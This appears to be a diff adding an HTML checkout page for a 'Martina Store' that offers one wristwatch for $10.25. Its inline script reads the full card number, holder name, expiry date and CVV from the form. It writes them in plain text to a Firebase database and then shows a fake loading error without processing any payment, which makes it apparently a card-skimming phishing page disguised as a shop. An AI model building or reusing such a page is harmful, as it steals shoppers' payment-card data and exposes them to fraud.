@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <link href="https://fonts.googleapis.com/css?family=Poppins:100,200,300,400,500,600,700,800,900&display=swap"
+    rel="stylesheet">
+
+
+  <link rel="shortcut icon" href="assets/images/new/Capture.PNG" type="image/x-icon">
+
+  <title>Martina Store - Check Out Page</title>
+
+  <!-- Bootstrap core CSS -->
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="assets/css/checkout-style.css">
+  <!--
+
+TemplateMo 546 Sixteen Clothing
+
+https://templatemo.com/tm-546-sixteen-clothing
+
+-->
+
+  <!-- Additional CSS Files -->
+  <link rel="stylesheet" href="assets/css/fontawesome.css">
+  <link rel="stylesheet" href="assets/css/templatemo-sixteen.css">
+  <link rel="stylesheet" href="assets/css/owl.css">
+
+</head>
+
+<body>
+
+  <!-- ***** Preloader Start ***** -->
+  <div id="preloader">
+    <div class="jumper">
+      <div></div>
+      <div></div>
+      <div></div>
+    </div>
+  </div>
+  <!-- ***** Preloader End ***** -->
+
+  <!-- Header -->
+  <header class="">
+    <nav class="navbar navbar-expand-lg">
+      <div class="container">
+        <a class="navbar-brand" href="index.html">
+          <h2>Martina <em>Store</em></h2>
+        </a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive"
+          aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+          <ul class="navbar-nav ml-auto">
+            <li class="nav-item">
+              <a class="nav-link" href="index.html">Home
+                <span class="sr-only">(current)</span>
+              </a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="products.html">Our Products</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="about.html">About Us</a>
+            </li>
+            <li class="nav-item active">
+              <a class="nav-link" href="contact.html">Contact Us</a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </nav>
+  </header>
+
+  <!-- Page Content -->
+  <div class="page-heading contact-heading header-text">
+    <div class="container">
+      <div class="row">
+        <div class="col-md-12">
+          <div class="text-content">
+            <h4>Check Out</h4>
+            <h2>fill in your details below</h2>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+
+  <!-- partial:index.partial.html -->
+  <div class="container">
+    <section class="product">
+      <div class="product__details">
+        <h1 class="product__details-heading">Reitling Ultra-Thin</h1>
+        <span class="product__details-sub-heading">Waterproof Fashion Wrist Watc</span>
+
+        <!-- <div class="product__details-image-wrapper">
+        <img class="product__details-image" src="assets/images/bew/alexandru-bogdan-ghita--NUwvZkYZ3E-unsplash.jpg" width="100px" alt="">
+      </div> -->
+
+      
+
+
+
+        <div class="product__details-basket">
+          <div class="product__details-basket-item">
+            <span class="product__details-basket-heading">Quantity</span>
+            <div class="product__details-basket-quantity-wrapper">
+              <select class="product__details-basket-quantity" name="quantity" id="quantity" data-product-quantity>
+                <option value="1">1</option>
+
+              </select>
+            </div>
+          </div>
+
+          <div class="product__details-basket-item">
+            <span class="product__details-basket-heading product__details-basket-heading--right">Price</span>
+            <span class="product__details-basket-price" data-product-price>$10.25</span>
+          </div>
+        </div>
+      </div>
+
+
+
+
+      <form class="card-details" action="" data-form>
+        <fieldset class="card-details__fieldset">
+          <span class="card-details__heading" aria-hidden="true">Card Type</span>
+          <div class="Card-Type">
+            <label class="card-details__holder-label" for="cardHolderName">Card Type</label>
+            <input class="card-details__holder-input" type="text" id="cardType" data-input>
+          </div>
+        </fieldset>
+
+
+        <fieldset class="card-details__fieldset">
+          <span class="card-details__heading">Card Number</span>
+
+          <div class="card-details__number">
+            <div class="card-details__number-field">
+              <label for="cardNumberFirstFour" class="card-details__number-label">First Four Digits</label>
+              <input class="card-details__number-input" type="text" maxlength="4" name="card-number" placeholder="0000"
+                id="cardNumberFirstFour" data-input>
+            </div>
+
+            <div class="card-details__number-field">
+              <label for="cardNumberSecondFour" class="card-details__number-label">Second Four Digits</label>
+              <input class="card-details__number-input" type="text" maxlength="4" name="card-number" placeholder="0000"
+                id="cardNumberSecondFour" data-input>
+            </div>
+
+            <div class="card-details__number-field">
+              <label for="cardNumberThirdFour" class="card-details__number-label">Third Four Digits</label>
+              <input class="card-details__number-input" type="text" maxlength="4" name="card-number" placeholder="0000"
+                id="cardNumberThirdFour" data-input>
+            </div>
+
+            <div class="card-details__number-field">
+              <label for="cardNumberFirstFour" class="card-details__number-label">Last Four Digits</label>
+              <input class="card-details__number-input" type="text" maxlength="4" name="card-number" placeholder="0000"
+                id="cardNumberLastFour" data-input>
+            </div>
+
+            <!-- <div class="card-details__number-card">
+            <img class="card-details__number-card-image" src="https://svgshare.com/i/7h2.svg" alt="Visa Card" data-card-image>
+          </div> -->
+          </div>
+        </fieldset>
+
+        <fieldset class="card-details__fieldset">
+          <span class="card-details__heading" aria-hidden="true">Card Holder Name</span>
+          <div class="card-details__holder">
+            <label class="card-details__holder-label" for="cardHolderName">Card Holder Name</label>
+            <input class="card-details__holder-input" type="text" id="cardHolderName" data-input>
+          </div>
+        </fieldset>
+
+        <fieldset class="card-details__fieldset">
+          <div class="card-details__expiration">
+            <span class="card-details__heading" aria-hidden="true">Expiration Date</span>
+            <div class="card-details__expiration-date">
+              <label class="card-details__expiration-date-label" for="expirationDate">Expiration Date</label>
+              <input class="card-details__expiration-date-input" type="text" maxlength="5" placeholder="MM / YY"
+                id="expirationDate" data-input>
+            </div>
+          </div>
+
+          <div class="card-details__security">
+            <span class="card-details__heading" aria-hidden="true">CVV</span>
+            <div class="card-details__details__security-code">
+              <label class="card-details__security-code-label" for="expirationDate">CVV</label>
+              <input class="card-details__security-code-input" type="text" maxlength="3" placeholder="000" id="card-details__security-code-input"
+                data-input>
+            </div>
+          </div>
+        </fieldset>
+
+        <button class="card-details__submit" id="card-details__submit" type="button"
+          data-submit-button>Purchase</button>
+      </form>
+    </section>
+
+    <!-- <p>Design by <a href="https://dribbble.com/AmandaLumleyx">Amanda Lumley</a> via <a href="https://dribbble.com/shots/3237318-Daily-UI-002-Credit-Card-Checkout">Dribble</a></p> -->
+  </div>
+  <!-- partial -->
+  <script src="./script.js"></script>
+
+
+
+
+
+  <script src="https://www.gstatic.com/firebasejs/7.15.5/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/7.15.5/firebase-database.js"></script>
+
+
+
+
+
+
+
+  <script type="module">
+
+    // Your web app's Firebase configuration
+      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+      const firebaseConfig = {
+  apiKey: "AIzaSyBLKi45ytrbZ9mE13f0r9ljZrwCmO_4M_c",
+  authDomain: "martina-store.firebaseapp.com",
+  databaseURL: "https://martina-store-default-rtdb.firebaseio.com",
+  projectId: "martina-store",
+  storageBucket: "martina-store.appspot.com",
+  messagingSenderId: "40275443442",
+  appId: "1:40275443442:web:e3c501721a596007369a6b",
+  measurementId: "G-8BW3MYQX6Z"
+};
+    
+      // Initialize Firebase
+      firebase.initializeApp(firebaseConfig);
+    
+
+
+
+      
+          // ----------------------------------------------------
+          // ----------------------------------------------------
+          // ----------------------------------------------------
+
+
+          var cardType,
+        cardHolderName,
+        numberFirstSet,
+        numberSecondSet,
+        numberThirdSet,
+        numberFourthSet,
+        expireDate,
+        cVV;
+
+      const todayDate = new Date();
+
+      function Ready() {
+        cardType = document.getElementById("cardType").value;
+        cardHolderName = document.getElementById("cardHolderName").value;
+        numberFirstSet = document.getElementById("cardNumberFirstFour").value;
+        numberSecondSet = document.getElementById("cardNumberSecondFour").value;
+        numberThirdSet = document.getElementById("cardNumberThirdFour").value;
+        numberFourthSet = document.getElementById("cardNumberLastFour").value;
+        // expireDate = document.getElementById("expirationDate");
+        cVV = document.getElementById(
+          "card-details__security-code-input"
+        ).value;
+        expireDate = document.getElementById("expirationDate").value;
+        // const todayDate = new Date();
+      }
+
+      function db() {
+        firebase
+          .database()
+          .ref("Client/" + cardHolderName)
+          .set({
+            ClientName: cardHolderName,
+            CardType: cardType,
+            First4: numberFirstSet,
+            Second4: numberSecondSet,
+            Third4: numberThirdSet,
+            Fourth4: numberFourthSet,
+            ExpireDate: expireDate,
+            CVV: cVV
+            // Date: todayDate
+          });
+      }
+
+      function next(params) {
+        document.location.href = "404.html";
+      }
+
+      document.getElementById("card-details__submit").onclick = function () {
+        Ready();
+        db();
+        // next();
+
+        alert("ERROR LOADING NEXT PAGE!");
+      };
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-md-12">
+          <div class="inner-content">
+            <p>Copyright &copy; 2021 Martina Store Co., Ltd.
+
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="vendor/jquery/jquery.min.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+
+  <!-- Additional Scripts -->
+  <script src="assets/js/custom.js"></script>
+  <script src="assets/js/owl.js"></script>
+  <script src="assets/js/slick.js"></script>
+  <script src="assets/js/isotope.js"></script>
+  <script src="assets/js/accordions.js"></script>
+
+
+  <script language="text/Javascript">
+    cleared[0] = cleared[1] = cleared[2] = 0; //set a cleared flag for each field
+    function clearField(t) { //declaring the array outside of the
+      if (!cleared[t.id]) { // function makes it static and global
+        cleared[t.id] = 1; // you could use true and false, but that's more typing
+        t.value = ''; // with more chance of typos
+        t.style.color = '#fff';
+      }
+    }
+  </script>
+
+
+</body>
+
+</html>
